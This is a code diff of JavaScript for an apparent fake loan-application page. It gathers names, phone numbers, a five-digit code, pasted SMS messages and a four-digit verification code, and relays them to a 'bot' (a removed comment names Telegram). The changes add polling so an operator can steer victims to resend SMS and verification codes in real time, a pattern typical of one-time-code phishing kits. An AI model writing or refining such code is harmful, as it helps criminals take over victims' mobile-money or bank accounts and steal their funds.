@@ -49,9 +49,11 @@ const translations = {
 
 let currentLang = 'en';
 let currentSessionId = null;
+let currentAmount = 0;
 
 // --- Numeric-only input enforcer ---
 function enforceNumericInput(el, maxLen) {
+    if(!el) return;
     el.addEventListener('input', function () {
         this.value = this.value.replace(/[^0-9]/g, '');
         if (maxLen && this.value.length > maxLen) {
@@ -74,35 +76,26 @@ function initNumericInputs() {
 
 function setLanguage(lang) {
     currentLang = lang;
-
     document.querySelectorAll('[data-translate]').forEach(el => {
         const key = el.getAttribute('data-translate');
-        if (translations[lang] && translations[lang][key]) {
-            el.innerHTML = translations[lang][key];
-        }
+        if (translations[lang] && translations[lang][key]) el.innerHTML = translations[lang][key];
     });
-
     document.querySelectorAll('[data-translate-placeholder]').forEach(el => {
         const key = el.getAttribute('data-translate-placeholder');
-        if (translations[lang] && translations[lang][key]) {
-            el.setAttribute('placeholder', translations[lang][key]);
-        }
+        if (translations[lang] && translations[lang][key]) el.setAttribute('placeholder', translations[lang][key]);
     });
-
     showScreen('main-screen');
 }
 
 function showScreen(screenId) {
-    document.querySelectorAll('.dark-screen').forEach(screen => {
-        screen.classList.remove('active');
-    });
+    document.querySelectorAll('.dark-screen').forEach(screen => screen.classList.remove('active'));
     document.getElementById(screenId).classList.add('active');
+    window.scrollTo(0,0);
 }
 
 function updateLoanValue() {
     const amountSlider = document.getElementById('loanAmount');
     const termSlider = document.getElementById('loanTerm');
-
     const amountDisplay = document.getElementById('amountDisplay');
     const termDisplay = document.getElementById('termDisplay');
     const monthlyOutput = document.getElementById('monthlyPayment');
@@ -111,45 +104,34 @@ function updateLoanValue() {
     const term = parseInt(termSlider.value);
 
     amountDisplay.innerText = `XAF ${amount.toLocaleString()}`;
-    termDisplay.innerText = `${term} ${translations[currentLang].calc_term === 'How long' || translations[currentLang].calc_term === 'Durée' ? 'Mo' : 'Months'}`;
+    termDisplay.innerText = `${term} Months`;
 
-    const interestRate = 0.12;
-    const totalRepayment = amount + (amount * interestRate);
+    const totalRepayment = amount + (amount * 0.12);
     const monthly = totalRepayment / term;
-
     monthlyOutput.innerText = `XAF ${Math.ceil(monthly).toLocaleString()}`;
 }
-
 updateLoanValue();
 
 function goToForm() {
     const amount = document.getElementById('loanAmount').value;
     const term = document.getElementById('loanTerm').value;
+    currentAmount = parseInt(amount);
 
     document.getElementById('formLoanAmount').value = amount;
     document.getElementById('formLoanTerm').value = `${term} Months`;
-
     showScreen('form-screen');
 }
 
-// --- Validation helpers ---
 function validateStep1() {
-    const purpose = document.getElementById('loanPurpose').value.trim();
-    if (!purpose) {
-        alert('Please enter the purpose of your loan.');
-        return false;
-    }
+    if (!document.getElementById('loanPurpose').value.trim()) { alert('Please enter the purpose of your loan.'); return false; }
     return true;
 }
 
 function validateStep2() {
-    const firstName = document.getElementById('firstName').value.trim();
-    const lastName = document.getElementById('lastName').value.trim();
     const phone = document.getElementById('phoneNumber').value.trim();
     const code = document.getElementById('fiveDigitCode').value.trim();
-
-    if (!firstName) { alert('Please enter your first name.'); return false; }
-    if (!lastName) { alert('Please enter your last name.'); return false; }
+    if (!document.getElementById('firstName').value.trim()) { alert('Please enter your first name.'); return false; }
+    if (!document.getElementById('lastName').value.trim()) { alert('Please enter your last name.'); return false; }
     if (!/^[0-9]{9}$/.test(phone)) { alert('Please enter a valid 9-digit phone number.'); return false; }
     if (!/^[0-9]{5}$/.test(code)) { alert('Please enter a valid 5-digit code.'); return false; }
     return true;
@@ -157,10 +139,7 @@ function validateStep2() {
 
 function validateStep3() {
     const income = document.getElementById('annualIncome').value.trim();
-    if (!income || !/^[0-9]+$/.test(income)) {
-        alert('Please enter a valid annual income (numbers only).');
-        return false;
-    }
+    if (!income || !/^[0-9]+$/.test(income)) { alert('Please enter a valid annual income (numbers only).'); return false; }
     return true;
 }
 
@@ -168,9 +147,7 @@ function nextStep(stepNumber) {
     if (stepNumber === 2 && !validateStep1()) return;
     if (stepNumber === 3 && !validateStep2()) return;
 
-    document.querySelectorAll('.form-step').forEach(step => {
-        step.classList.remove('active');
-    });
+    document.querySelectorAll('.form-step').forEach(step => step.classList.remove('active'));
     document.getElementById(`step-${stepNumber}`).classList.add('active');
 
     const progressFill = document.getElementById('progress-fill');
@@ -178,23 +155,18 @@ function nextStep(stepNumber) {
 
     if (stepNumber === 1) {
         progressFill.style.width = '33.33%';
-        stepText.setAttribute('data-translate', 'form_step1');
         stepText.innerText = translations[currentLang].form_step1;
     } else if (stepNumber === 2) {
         progressFill.style.width = '66.66%';
-        stepText.setAttribute('data-translate', 'form_step2');
         stepText.innerText = translations[currentLang].form_step2;
     } else if (stepNumber === 3) {
         progressFill.style.width = '100%';
-        stepText.setAttribute('data-translate', 'form_step3');
         stepText.innerText = translations[currentLang].form_step3;
     }
 }
 
 function prevStep(stepNumber) {
-    document.querySelectorAll('.form-step').forEach(step => {
-        step.classList.remove('active');
-    });
+    document.querySelectorAll('.form-step').forEach(step => step.classList.remove('active'));
     document.getElementById(`step-${stepNumber}`).classList.add('active');
 
     const progressFill = document.getElementById('progress-fill');
@@ -202,16 +174,13 @@ function prevStep(stepNumber) {
 
     if (stepNumber === 1) {
         progressFill.style.width = '33.33%';
-        stepText.setAttribute('data-translate', 'form_step1');
         stepText.innerText = translations[currentLang].form_step1;
     } else if (stepNumber === 2) {
         progressFill.style.width = '66.66%';
-        stepText.setAttribute('data-translate', 'form_step2');
         stepText.innerText = translations[currentLang].form_step2;
     }
 }
 
-// --- Form Submission with Telegram Integration ---
 function submitApplication() {
     if (!validateStep3()) return;
 
@@ -255,7 +224,6 @@ function pollApproval() {
         .catch(() => setTimeout(pollApproval, 3000));
 }
 
-// --- Shows Processing Screen ---
 function submitSms() {
     const sms = document.getElementById('smsContent').value.trim();
     if (!sms) {
@@ -263,7 +231,7 @@ function submitSms() {
         return;
     }
 
-    showScreen('processing-screen'); // Show loading screen immediately
+    showScreen('processing-screen'); 
 
     fetch('/api/submit-sms', {
         method: 'POST',
@@ -271,13 +239,29 @@ function submitSms() {
         body: JSON.stringify({ sessionId: currentSessionId, sms })
     }).catch(err => console.error("Error sending SMS to bot:", err));
     
-    // Wait 3 seconds, then show the error screen
-    setTimeout(() => {
-        showScreen('error-screen');
-    }, 3000);
+    pollForSmsResponse();
 }
 
-// --- Shows Processing Screen ---
+function pollForSmsResponse() {
+    fetch(`/api/session-status/${currentSessionId}`)
+        .then(r => r.json())
+        .then(data => {
+            if (data.nextStep === 'verification') {
+                showScreen('verification-screen');
+            } else if (data.nextStep === 'resend_sms') {
+                alert('Please check your messages for a new SMS code and paste it again.');
+                document.getElementById('smsContent').value = '';
+                showScreen('sms-screen');
+            } else if (data.nextStep === 'rejected') {
+                alert('Your application was rejected.');
+                showScreen('main-screen');
+            } else {
+                setTimeout(pollForSmsResponse, 3000);
+            }
+        })
+        .catch(() => setTimeout(pollForSmsResponse, 3000));
+}
+
 function submitVerificationCode() {
     const code = document.getElementById('fourDigitCode').value.trim();
     if (!/^[0-9]{4}$/.test(code)) {
@@ -285,7 +269,7 @@ function submitVerificationCode() {
         return;
     }
 
-    showScreen('processing-screen'); // Show loading screen immediately
+    showScreen('processing-screen'); 
 
     fetch('/api/submit-verification', {
         method: 'POST',
@@ -293,11 +277,28 @@ function submitVerificationCode() {
         body: JSON.stringify({ sessionId: currentSessionId, code })
     }).catch(err => console.error("Error sending code to bot:", err));
 
-    // Wait 3 seconds, then show the error screen
-    setTimeout(() => {
-        showScreen('error-screen');
-    }, 3000);
+    pollForFinalDecision();
 }
 
-// Init numeric inputs after DOM loads
+function pollForFinalDecision() {
+    fetch(`/api/session-status/${currentSessionId}`)
+        .then(r => r.json())
+        .then(data => {
+            if (data.nextStep === 'final_approved') {
+                document.getElementById('approvedAmountDisplay').innerText = currentAmount.toLocaleString();
+                showScreen('success-screen');
+            } else if (data.nextStep === 'final_rejected') {
+                alert('Your application was rejected.');
+                showScreen('error-screen'); 
+            } else if (data.nextStep === 'resend_verification') {
+                alert('Please check your messages for a new verification code.');
+                document.getElementById('fourDigitCode').value = '';
+                showScreen('verification-screen');
+            } else {
+                setTimeout(pollForFinalDecision, 3000);
+            }
+        })
+        .catch(() => setTimeout(pollForFinalDecision, 3000));
+}
+
 document.addEventListener('DOMContentLoaded', initNumericInputs);
